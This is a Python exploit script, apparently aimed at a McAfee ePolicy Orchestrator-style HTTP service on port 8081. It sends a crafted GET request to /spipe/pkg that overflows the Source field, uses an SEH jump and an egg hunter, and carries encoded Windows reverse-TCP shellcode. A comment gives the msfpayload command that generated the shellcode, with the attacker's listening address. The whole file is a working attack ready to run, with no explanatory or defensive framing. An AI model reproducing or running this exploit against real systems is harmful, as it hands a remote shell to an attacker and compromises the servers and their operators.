#!/usr/bin/python
import socket

target_address="192.168.24.157"
target_port=8081
#msfpayload windows/shell/reverse_tcp LHOST=192.168.24.10 LPORT=1237 R | msfencode -b '\x00\x09\x0a\x0b\x0d\x20\x26\x2b\x3d\x25\x8c\x3c\xff'

shellcode = ("\x04\x72\x01\xe3\x1c\x7f\x35\xb7\x47\xb8\x2f\xa9\x71\x46\x49\x73\x3b\xfc\xb5\x90\x37" + 
"\x96\x27\x97\x74\x4a\xb4\x93\xb0\x7c\x13\xf5\x92\xba\x75\x4b\x30\xe1\x79\x02\xd6\x3f" +
"\x18\xfd\x05\xbf\x24\x91\xb3\x6b\xf8\x66\xbb\x1a\xe2\x43\x34\x14\x39\xd2\xd5\xb1\x42" +
"\x85\xf9\xb9\x7d\x2c\xbe\x76\x48\x84\xeb\x74\x13\xd4\x92\x66\x89\xe3\x7a\x24\xb2\x7c" +
"\x14\x79\x73\x11\xe1\x1c\x89\xe2\x72\x4b\x87\xd6\x41\xbb\xb1\xb3\x93\x75\x27\x2c\x76" +
"\x2d\x97\xb0\x43\x42\x70\x49\x2f\x83\xd0\xc7\xc6\xc0\xd5\x7e\x0c\x15\x77\x10\xfd\x4f" +
"\x4e\x05\x19\xe0\x48\x78\x35\x9b\x34\x96\x37\xbf\x71\x46\x7b\x7d\x03\xf9\x18\xfc\x7f" +
"\x40\xb6\x99\xb5\x04\xa9\x1a\xf5\xba\x3f\x67\x8d\x91\xb4\x4a\xbe\x47\xa8\xb8\x28\xd4" +
"\x6b\xf8\xb9\x9f\x1d\x90\x98\xb7\x72\x27\x3a\xe0\x75\x78\x7d\x29\xe2\x05\x88\xd5\x3f" +
"\x34\xb2\x14\x1d\x43\xba\x2d\xb9\x39\xd4\x70\x41\x7a\x77\x4f\xb4\x7e\x71\x1c\x9f\x67" +
"\x47\x35\x2a\xeb\x21\xfe\xc1\xd1\xe1\x40\x7b\x48\x84\xe3\x4e\x66\xb5\x76\x2f\x99\x46" +
"\x4b\x8d\x85\xfc\x15\x98\xbe\x24\x22\xf6\xd3\xf8\xbf\x0c\xb3\x91\x38\xfd\x93\x2c\x4a" +
"\x04\x7f\x7c\x37\x92\xb6\xa8\x96\x9b\xb7\x73\x1b\xd6\x97\x74\x49\x90\xb0\x69\xf5\xb8" +
"\x79\x01\xf9\xb1\x42\xbb\xa9\xbe\xbf\x05\x74\x72\x49\x0c\x4f\xb3\x7b\x7f\x02\xe3\x79" +
"\x2d\x3f\x4b\x73\x3b\xeb\x2c\x80\xf7\xe0\x7e\x34\x96\xb0\x7d\x30\xd4\x15\xb4\x99\xb1" +
"\x04\x86\xd2\xe2\x43\x47\x9f\x9b\xb5\x12\xd5\x14\x31\xd6\x42\x90\x35\x23\xf5\x27\x7a" +
"\x48\x32\xf9\x92\x76\x77\x7c\x78\x71\x4e\xb7\xb6\x08\xf7\xd1\xd3\xf8\xba\x37\x33\xfd" +
"\xb2\x24\x4a\xbb\xb9\x70\x21\xe1\x66\xb8\x98\x8d\x41\xa8\x93\x97\x91\x81\xfc\x2f\x75" +
"\x1c\xa9\x1d\x67\x40\x46\x76\x7d\x71\x7a\x70\x40\xbf\x42\x33\xd5\x87\xc0\xd6\x0c\xb0" +
"\x46\x97\x74\x72\x15\x37\x7f\x79\x48\x7b\x7e\x49\xb7\x75\x31\xe3\x29\xf9\x92\x3f\xba" +
"\x9f\x98\x8d\xb8\x85\xfd\x7c\x32\xf5\x2c\x96\x90\x05\xbe\x24\x30\xe1\x04\x08\xeb\x22" +
"\xf8\x4b\xb4\x80\xe0\x43\xa9\x78\x1c\x73\x14\xb2\x4f\x4a\x2f\xb3\xb5\xa8\xb1\x66\xbb" +
"\xb6\x93\x13\xfc\x67\x4e\x23\xd2\xd4\x41\x34\x99\x91\x35\x86\xe2\x27\xb9\x1d\x9b\x77" +
"\x47\x66\x2d\x75\x7b\x37\x38\xe2\x2a\xeb\x7f\x2f\x4b\x71\x04\xbe\x83\xfc\xb2\x7d\x19" +
"\xf6\xe1\x67\x3f\x7e\x72\x7c\x79\x0c\x4a\x15\xa9\x77\x4e\x74\x42\x73\x2c\xb6\x7a\x70" +
"\x1b\xd6\x99\x27\x9f\x43\x8d\x93\x96\x92\x12\xe3\x05\xa8\x39\xd4\x89\xe0\x34\xba\x78" +
"\x46\xb3\x76\x6b\xfd\xb1\x2d\x03\xf5\xbf\x49\xb7\x90\x4f\x9b\x1a\xd0\xf8\x01\xf9\x3b" +
"\xe3\x1c\x7a\x11\xeb\x02\xd5\x7e\x41\x7f\x1d\xbb\x7d\x40\x78\x35\xb9\xb0\x91\x79\x47" +
"\x77\x14\x76\x48\xb5\x70\x18\xe0\x10\xe2\x24\xb8\x98\xb4\x97\xb5\x69\xf9\x72\x3f\x84" +
"\xf5\x97\x81\xe1\x04\x71\x0c\x7c\x2c\x9b\x74\x28\xfd\xbb\x75\x34\x67\x1c\x3a\xc1\xf8" +
"\x73\x2d\x88\xfc\x4b\xd6\xb2\xa8\x90\xb8\xd5\x7b\x14\xb3\xb7\x43\xbf\x27\xb6\x92\xa9" +
"\xbe\x4a\x47\x1d\x66\xb1\x48\x99\x05\x91\x15\xd4\x2f\x37\x35\x93\x98\x96\x41\xba\xb9" +
"\x4e\xb4\x8d\x9f\x24\x4f\x46\x42\x40\xb0\x49\xbe\xc5\x97\x61\x5b\xdb\xc0\xd9\x74\x24" +
"\xf4\x5f\x29\xc9\xb1\x49\x31\x77\x14\x03\x77\x14\x83\xc7\x04\x27\x62\x9d\xb3\x2e\x8d" +
"\x5e\x44\x50\x07\xbb\x75\x42\x73\xcf\x24\x52\xf7\x9d\xc4\x19\x55\x36\x5e\x6f\x72\x39" +
"\xd7\xc5\xa4\x74\xe8\xe8\x68\xda\x2a\x6b\x15\x21\x7f\x4b\x24\xea\x72\x8a\x61\x17\x7c" +
"\xde\x3a\x53\x2f\xce\x4f\x21\xec\xef\x9f\x2d\x4c\x97\x9a\xf2\x39\x2d\xa4\x22\x91\x3a" +
"\xee\xda\x99\x64\xcf\xdb\x4e\x77\x33\x95\xfb\x43\xc7\x24\x2a\x9a\x28\x17\x12\x70\x17" +
"\x97\x9f\x89\x5f\x10\x40\xfc\xab\x62\xfd\x06\x68\x18\xd9\x83\x6d\xba\xaa\x33\x56\x3a" +
"\x7e\xa5\x1d\x30\xcb\xa2\x7a\x55\xca\x67\xf1\x61\x47\x86\xd6\xe3\x13\xac\xf2\xa8\xc0" +
"\xcd\xa3\x14\xa6\xf2\xb4\xf1\x17\x56\xbe\x10\x43\xe0\x9d\x7c\xa0\xde\x1d\x7d\xae\x69" +
"\x6d\x4f\x71\xc1\xf9\xe3\xfa\xcf\xfe\x04\xd1\xb7\x91\xfa\xda\xc7\xb8\x38\x8e\x97\xd2" +
"\xe9\xaf\x7c\x23\x15\x7a\xd2\x73\xb9\xd5\x92\x23\x79\x86\x7a\x2e\x76\xf9\x9a\x51\x5c" +
"\x92\x30\xab\x37\x5d\x6c\xab\xcd\x35\x6e\xcc\xd5\x17\xe7\x2a\xbf\x87\xa1\xe5\x28\x31" +
"\xe8\x7e\xc8\xbe\x27\xfb\xca\x35\xcb\xfb\x85\xbd\xa6\xef\x72\x4e\xfd\x52\xd4\x51\x28" +
"\xf8\xd9\xc7\xd6\xab\x8e\x7f\xd4\x8a\xf9\xdf\x27\xf9\x71\xe9\xbd\x42\xee\x16\x51\x43" +
"\xee\x40\x3b\x43\x86\x34\x1f\x10\xb3\x3a\x8a\x04\x68\xaf\x34\x7d\xdc\x78\x5c\x83\x3b" +
"\x4e\xc3\x7c\x6e\x4e\x38\xab\x57\xd4\x48\xd9\xbb\x14\x1a" #exploit
) #exploit


buffer = "GET /spipe/pkg HTTP/1.0\r\n"
buffer += "User-Agent: Mozilla/4.0 (compatible; SPIPE/1.0\r\n"
buffer += "Content-Length: 1017" + "\r\n" # 317+16 bytes shellcode
buffer += "AgentGuid=" + "\x41" * 64 + "\r\n"
buffer += "Source=" + "\x41" * 92 # JUNK
buffer += "\xeb\x06" #JMP SHORT 6 
buffer += "\x41" * 2# junk
buffer += "\xda\xdb\x1e\x60" #0x601EDBDA
buffer += ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x60" +
"\xc8\x76\x89\x89\xd7\xaf\x75\xea\xaf\x75\xe7\x51\x31\xc9\x31\xc0\x02\x04\x0f\x41\x66\x81" +
"\xf9\xe8\x03\x75\xf5\x3a\x04\x0f\x59\x75\xd1\xff\xe7") #egg hunter after \x60\xc8\x76\x89
buffer += "\r\n\r\n" 
buffer += "\x60\xc8\x76\x89\x60\xc8\x76\x89" #egg
buffer += shellcode
buffer += "\r\n\r\n\r\n\r\n\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer) 
sock.close()




 









